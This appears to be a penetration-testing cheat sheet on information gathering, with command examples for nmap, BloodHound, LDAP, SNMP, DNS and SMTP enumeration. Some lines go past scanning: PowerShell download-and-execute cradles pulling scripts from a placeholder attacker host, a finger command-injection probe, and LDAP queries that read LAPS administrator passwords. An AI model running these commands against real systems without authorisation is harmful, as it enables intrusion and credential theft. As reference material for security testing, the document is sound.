# Information Gathering

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Resources)
- [Amass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Amass)
- [Banner Grabbing](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Banner-Grabbing)
- [BloodHound](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#BloodHound)
- [BloodHound Python](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#BloodHound-Python)
- [Certify](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Certify)
- [dmitry](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#dmitry)
- [DMARC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#DMARC)
- [DNS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#DNS)
- [dnsenum](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#dnsenum)
- [dnsrecon](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#dnsrecon)
- [enum4linux](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#enum4linux)
- [Enyx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Enyx)
- [finger](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#finger)
- [ldapsearch](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#ldapsearch)
- [MASSCAN](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#MASSCAN)
- [Minimalistic Offensive Security Tools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Minimalistic-Offensive-Security-Tools)
- [memcached](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#memcached)
- [Naabu](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Naabu)
- [netdiscover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#netdiscover)
- [NetBIOS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#NetBIOS)
- [Nmap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#Nmap)
- [onesixtyone](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#onesixtyone)
- [PoshADCS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#PoshADCS)
- [pspy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#pspy)
- [rpclient](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#rpclient)
- [SharpHound](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#SharpHound)
- [SMTP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#SMTP)
- [SNMP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#SNMP)
- [snmp-check](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#snmp-check)
- [SNMP-MIBS-Downloader](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#SNMP-MIBS-Downloader)
- [snmpwalk](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#snmpwalk)
- [SPF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#SPF)
- [sslscan](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#sslscan)
- [sslyze](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#sslyze)
- [subfinder](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#subfinder)
- [tcpdump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/01_information_gathering.md#tcpdump)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Nmap | Network Scanner | https://github.com/nmap/nmap |
| BashScan | BashScan is a port scanner built to utilize /dev/tcp for network and service discovery on systems that have limitations or are otherwise unable to use alternative scanning solutions such as nmap. | https://github.com/astryzia/BashScan |
| Amass | The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques. | https://github.com/OWASP/Amass |
| naabu | Naabu is a port scanning tool written in Go that allows you to enumerate valid ports for hosts in a fast and reliable manner. | https://github.com/projectdiscovery/naabu |
| subfinder | Fast passive subdomain enumeration tool. | https://github.com/projectdiscovery/subfinder |
| Knock Subdomain Scan | Knockpy is a python3 tool designed to quickly enumerate subdomains on a target domain through dictionary attack. | https://github.com/guelfoweb/knock |
| ASNmap | Go CLI and Library for quickly mapping organization network ranges using ASN information. | https://github.com/projectdiscovery/asnmap |
| ASNLookup | Quickly look up updated information about specific ASN, Organization or registered IP addresses (IPv4 and IPv6) among other relevant data. | https://asnlookup.com |
| IPinfo | Accurate IP address data that keeps pace with secure, specific, and forward-looking use cases. | https://ipinfo.io |
| wtfis | Passive hostname, domain and IP lookup tool for non-robots | https://github.com/pirxthepilot/wtfis |
| crt.sh | Certificate Search | https://crt.sh |
| crt.sh CLI | Certificate Search | https://github.com/az7rb/crt.sh |
| CTFR | CTFR does not use neither dictionary attack nor brute-force, it just abuses of Certificate Transparency logs. | https://github.com/UnaPibaGeek/ctfr |
| Censys | Attack Surface Management | https://search.censys.io |
| Driftnet | Exposure Analysis | https://driftnet.io |
| Hardenize | Network Perimeter Monitoring | https://www.hardenize.com |
| dnsx | dnsx is a fast and multi-purpose DNS toolkit allow to run multiple probes using retryabledns library, that allows you to perform multiple DNS queries of your choice with a list of user supplied resolvers, additionally supports DNS wildcard filtering like shuffledns. | https://github.com/projectdiscovery/dnsx |
| DNSdumpster | DNSdumpster.com is a FREE domain research tool that can discover hosts related to a domain. | https://dnsdumpster.com |
| proxify | Swiss Army Knife Proxy for rapid deployments. | https://github.com/projectdiscovery/proxify |
| reconFTW | Reconnaissance Automation | https://github.com/six2dez/reconftw |
| pspy | pspy is a command line tool designed to snoop on processes without need for root permissions. | https://github.com/DominicBreuker/pspy |
| enum4linux | A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts. | https://github.com/CiscoCXSecurity/enum4linux |
| enum4linux-ng | A next generation version of enum4linux. | https://github.com/cddmp/enum4linux-ng |
| Jackdaw | Jackdaw is here to collect all information in your domain, store it in a SQL database and show you nice graphs on how your domain objects interact with each-other an how a potential attacker may exploit these interactions. | https://github.com/skelsec/jackdaw |
| BloodHound | BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. | https://github.com/BloodHoundAD/BloodHound |
| BloodHound Python | BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. | https://github.com/fox-it/BloodHound.py |
| RustHound | Active Directory data collector for BloodHound written in rust. | https://github.com/OPENCYBER-FR/RustHound |
| SharpHound | C# Data Collector for BloodHound | https://github.com/BloodHoundAD/SharpHound |
| SMBeagle | SMBeagle - Fileshare auditing tool. | https://github.com/punk-security/smbeagle |
| Ping Castle | Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. | https://github.com/vletoux/pingcastle |
| Minimalistic Offensive Security Tools | Minimalistic TCP and UDP port scanners. | https://github.com/InfosecMatter/Minimalistic-offensive-security-tools |

## Amass

> https://github.com/OWASP/Amass

```c
$ amass intel --asn <ASN>
$ amass intel --asn <ASN> -list
$ amass enum -active -d <TARGET_DOMAIN> -p 80,443,8080
```

## Banner Grabbing

> https://book.hacktricks.xyz/pentesting/pentesting-imap#banner-grabbing

```c
$ nc -v <RHOST> 80
$ telnet <RHOST> 80
$ curl -vX <RHOST>
```

## BloodHound

> https://github.com/BloodHoundAD/BloodHound

### Installation

```c
$ pip install bloodhound
$ sudo apt-get install neo4j
$ sudo apt-get install bloodhound
```

### Installing and starting Database

```c
$ wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
$ sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
$ sudo apt-get update
$ sudo apt-get install apt-transport-https
$ sudo apt-get install neo4j
$ systemctl start neo4j
```

```c
$ sudo neo4j start console
$ sudo bloodhound --no-sandbox
```

>  http://localhost:7474/browser/

### Alternatively

```c
$ sudo npm install -g electron-packager
$ git clone https://github.com/BloodHoundAD/Bloodhound
$ cd BloodHound
$ npm install
$ npm run linuxbuild
$ cd BloodHound-linux-x64
$ sudo ./BloodHound --no-sandbox
```

### Custom Queries

> https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/bloodhound/Handy-BloodHound-Cypher-Queries.md

## BloodHound Python

### Collection Method All

```c
$ bloodhound-python -d <TARGET_DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <TARGET_DOMAIN> -c all -ns <RHOST>
```

### LDAP Dumping

```c
$ bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <RHOST> -d <TARGET_DOMAIN> -c All
```

### Parsing

```c
$ cat 20220629013701_users.json | jq | grep \"name\"
```

## Certify

> https://github.com/GhostPack/Certify

```c
PS C:\> .\Certify.exe find /vulnerable /currentuser
```

## dmitry

```c
$ dmitry -p <RHOST>
```

## DMARC

```c
$ dig txt _dmarc.<TARGET_DOMAIN> | grep dmarc
```

## DNS

```c
$ whois <TARGET_DOMAIN>
$ dig @<RHOST> -x <TARGET_DOMAIN>
$ dig {a|txt|ns|mx} <TARGET_DOMAIN>
$ dig {a|txt|ns|mx} <TARGET_DOMAIN> @ns1.<TARGET_DOMAIN>
$ dig axfr @<RHOST> <TARGET_DOMAIN>    // zone transfer - needs 53/TCP
$ host -t {a|txt|ns|mx} <TARGET_DOMAIN>
$ host -a <TARGET_DOMAIN>
$ host -l <TARGET_DOMAIN> ns1.<TARGET_DOMAIN>
$ nslookup -> set type=any -> ls -d <TARGET_DOMAIN>
$ for sub in $(cat subTARGET_DOMAINs.txt);do host $sub.<TARGET_DOMAIN:|grep "has.address";done
```

## dnsenum

```c
$ dnsenum <TARGET_DOMAIN>
$ dnsenum --threads 64 --dnsserver <RHOST> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <TARGET_DOMAIN>
```

## dnsrecon

```c
$ sudo vi /etc/hosts
$ dnsrecon -r 127.0.0.0/24 -n <RHOST>
$ dnsrecon -r 127.0.1.0/24 -n <RHOST>
$ dnsrecon -d <TARGET_DOMAIN> -t axfr @ns2.<TARGET_DOMAIN>
```

## enum4linux

> https://github.com/CiscoCXSecurity/enum4linux

```c
$ enum4linux -a <RHOST>
```

## enum4linux-ng

> https://github.com/cddmp/enum4linux-ng

```c
$ enum4linux-ng -a <RHOST>
```

## Enyx

> https://github.com/trickster0/Enyx

### Grabbing IPv6 Address

```c
$ python enyx.py 2c public <RHOST>
```

## finger

### finger Port 79/TCP

```c
$ finger root@<RHOST>
$ finger "|/bin/id@<RHOST>"

msf6 > use auxiliary/scanner/finger/finger_users
```

> https://github.com/pentestmonkey/finger-user-enum

```c
$ ./finger-user-enum.pl -U users.txt -t <RHOST>
```

## ldapsearch

```c
$ ldapsearch -x -h <RHOST> -s base namingcontexts
$ ldapsearch -D <USERNAME> -H ldap://<RHOST> -w "<PASSWORD>" -b "CN=Users,DC=contoso,DC=local" | grep info
$ ldapsearch -x -b "dc=<TARGET_DOMAIN>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
$ ldapsearch -x -D "cn=admin,dc=<TARGET_DOMAIN>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
$ ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
$ ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<TARGET_DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
$ ldapsearch -x -w <PASSWORD>
```

## MASSCAN

> https://github.com/robertdavidgraham/masscan

```c
$ sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive <RHOST>
```

## Minimalistic Offensive Security Tools

> https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

### port-scan-tcp.ps1

```c
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/port-scan-tcp.ps1')
```

## memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

$ npm install -g memcached-cli
$ memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
$ echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

$ sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

$ stats items
$ stats cachedump 1 0
$ get link
$ get file
$ get user
$ get passwd
$ get account
$ get username
$ get password
```

## Naabu

```c
$ sudo naabu -p - -l /PATH/TO/FILE/<FILE> -o /PATH/TO/FILE/<FILE>
```

## netdiscover

```c
$ sudo netdiscover -i <INTERFACE> -r <RHOST>
```

## NetBIOS

```c
$ nbtscan <RHOST>
$ nmblookup -A <RHOST>
```

## Nmap

```c
$ nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
$ nmap -A -T4 -sC -sV --script vuln <RHOST>
$ nmap -sV --script http-trace <RHOST>
$ nmap -sV --script ssl-cert -p 443 <RHOST>
$ nmap -sV --script ssl-enum-ciphers -p 443 <RHOST>
$ nmap -A -T4 -p- <RHOST>
$ nmap -A -T4 -sS -sU -v <RHOST>
$ nmap -sC -sV -oN initial --script discovery <RHOST>
$ nmap -sC -sV -oA nmap <RHOST>
$ nmap -sS -sV <RHOST>
$ nmap -p- <RHOST>    // full port scan
$ nmap -sS <RHOST>    // ping scan
$ nmap -sT <RHOST>    // TCP scan
$ nmap -sU <RHOST>    // UDP scan
$ nmap  --script safe -p 445 <RHOST>    // detailed scan on smb

-p1-65535               // ports
-p-                     // all ports
-sV                     // version detection
-sS                     // TCP SYN scan
-sT                     // TCP connect scan
-sU                     // UDP scan
-sX                     // Xmas scan (sets FIN, PSH, URG flags)
-sC                     // script scan
-PN                     // no ping
-6                      // IPv6
-n                      // no dns resolution
-O                      // OS detection
-A                      // aggressive scan
-T4                     // timing options
-oA                     // write to file (basename)
-oN                     // write to file (normal)
-f                      // fragment packets
-S                      // spoof src ip address
-g                      // spoof src port
--mtu                   // set MTU size
--spoof-mac             // spoof mac address
--data-length <size>    // append random data
--scan-delay 5s         // delay
--max-retries 1         // set retry limit to speed the scan up
```

### Getting Script Locations

```c
$ ls -lh /usr/share/nmap/scripts/*ssh*
$ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

### Converting Report

```c
$ xsltproc nmap.xml -o nmap.html
```

### Generate grepable Output for IP Addresses

```c
$ sudo nmap -iL /PATH/TO/FILE/<FILE> -p- -oG /PATH/TO/FILE/<FILE> | awk -v OFS=':' '/open/ {for (i=4;i<=NF;i++) {split($i,a,"/"); if (a[2]=="open") print $2, a[1]}}' | sort | uniq > /PATH/TO/FILE/<FILE>
```

### SMB

```c
$ nmap -sV --script=smb-enum-shares -p 445 <RHOST>
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <RHOST>
```

### Port Knocking

```c
$ for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x <RHOST>; done
```

### RPC

```c
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <RHOST>
```

### Kerberos

```c
$ nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
```

### File transfer (PUT)

```c
$ nmap -p 80 <RHOST> --script http-put --script-args http-put.url='<TARGET_URL>',http-put.file='<FILE>'
```

## onesixtyone

>  https://github.com/trailofbits/onesixtyone

### Brute-Force Community Strings

```c
$ onesixtyone -i snmp-ips.txt -c community.txt
```

## PoshADCS

>  https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1

```c
PS C:\> curl http://<LHOST>/ADCS.ps1 | iex
PS C:\> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose
PS C:\> gci cert:\currentuser\my -recurse
```

## pspy

>  https://github.com/DominicBreuker/pspy

```c
$ pspy64 -f
$ pspy64 -pf -i 1000
```

## rpclient

### LDAP

```c
$ rpcclient -U "" <RHOST>
```

#### Queries

```c
srvinfo
netshareenum
netshareenumall
netsharegetinfo
netfileenum
netsessenum
netdiskenum
netconnenum
getanydcname
getdcname
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdomusers
enumdata
enumjobs
enumports
enumprivs
queryuser <USERNAME>
```

## SharpHound

>  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe

```c
$ .\SharpHound.exe --CollectionMethod All
```

## SMTP

```c
telnet 10.10.10.77 25
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO foobar.com
250 Hello.
MAIL FROM: <foobar@contoso.local>
250 OK
RCPT TO: <barfoo@contoso.local>
250 OK
RCPT TO: <admin@contoso.local>
250 OK
RCPT TO: <foobar@contoso.local>
250 OK
RCPT TO: <foobar@contoso.localb>
250 OK

$ smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
$ smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
$ smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
```

## SNMP

### SNMP Byte Calculation

```c
$ python3
Python 3.9.7 (default, Sep  3 2021, 06:18:44)
[GCC 10.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135'
>>> binascii.unhexlify(s.replace(' ',''))
b'P@ssw0rd@123!!123\x13\x91q\x81\x92"2Rbs\x03\x133CSs\x83\x94$4\x95\x05\x15Eu\x86\x16WGW\x98(8i\t\x19IY\x81\x03\x10a\x11\x11A\x15\x11\x91"\x121&\x13\x011\x13A5'
```

## snmp-check

```c
$ snmp-check <RHOST>
```

## SNMP-MIBS-Downloader

>  https://github.com/codergs/SNMP-MIBS-Downloader

```c
$ sudo apt-get install snmp-mibs-downloader
```

### Comment out "mibs: line"

```c
$ sudo vi /etc/snmp/snmp.conf
```

## snmpwalk

### Full Enumeration

```c
$ snmpwalk -c public -v1 <RHOST>
```

```c
$ snmpwalk -c internal -v2c <RHOST>
```

### Network Addresses

```c
$ snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
```

### Detailed Output

```c
$ snmpwalk -v2c -c public <RHOST> .1
```

### OS / User Details

```c
$ snmpwalk -v2c -c public <RHOST> nsExtendObjects
```

### Windows User Accounts

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
```

### Windows Running Programs

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
```

### Windows Hostname

```c
$ snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
```

### Windows Share Information

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
```

### Windows Share Information

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
```

### Windows TCP Ports

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
```

### Software Names

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

## SPF

```c
$ dig txt <TARGET_DOMAIN> | grep spf
```

## sslscan

```c
$ sslscan <RHOST>
```

## sslyze

```c
$ sslyze <RHOST>
```

## subfinder

```c
$ subfinder -dL /PATH/TO/FILE/<FILE>
$ subfinder -dL /PATH/TO/FILE/<FILE> -nW -ip -p /PATH/TO/FILE/<FILE>
```

## tcpdump

```c
$ tcpdump -envi <INTERFACE> host <RHOST> -s0 -w /PATH/TO/FILE/<FILE>.pcap
```
